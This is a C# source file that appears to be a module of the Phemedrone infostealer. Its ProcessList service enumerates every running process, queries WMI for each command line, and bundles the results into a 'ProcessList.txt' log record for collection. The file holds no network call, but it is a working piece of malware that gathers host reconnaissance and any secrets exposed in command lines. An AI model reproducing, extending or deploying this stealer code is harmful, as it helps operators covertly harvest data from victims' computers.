using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Text;
using Phemedrone.Classes;

namespace Phemedrone.Services;

public class ProcessList : IService
{   
    public override PriorityLevel Priority => PriorityLevel.Low;
    protected override string GetServiceName() => "ProcessList";
    protected override LogRecord[] Collect()
    {
        var array = new List<string>();
        foreach (var proc in Process.GetProcesses())
        {
            try
            {
                var pid = proc.Id;
                var name = proc.ProcessName;
                var commandLine = GetCommandLine(proc);
                
                array.Add(Format(name, pid, commandLine));
            }
            catch
            {
                // ignore
            }
        }
        
        return new[]
        {
            new LogRecord
            {
                Path = "ProcessList.txt",
                Content = Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", array.ToArray()))
            }
        };
    }
    
    private static string Format(string ProcessName, int ProcessId, string CommandLine)
    {
        return $"Process: {ProcessName}.exe\nPID: {ProcessId}\nCommand Line: {(CommandLine is null or "" ? "NONE" : CommandLine)}";
    }

    private static string GetCommandLine(Process process)
    {
        try
        {
            using var searcher =
                new ManagementObjectSearcher("SELECT CommandLine FROM Win32_Process WHERE ProcessId = " + process.Id);
            using var objects = searcher.Get();
            return objects.Cast<ManagementBaseObject>().SingleOrDefault()?["CommandLine"]?.ToString();
        }
        catch
        {
            return null;
        }
    }
}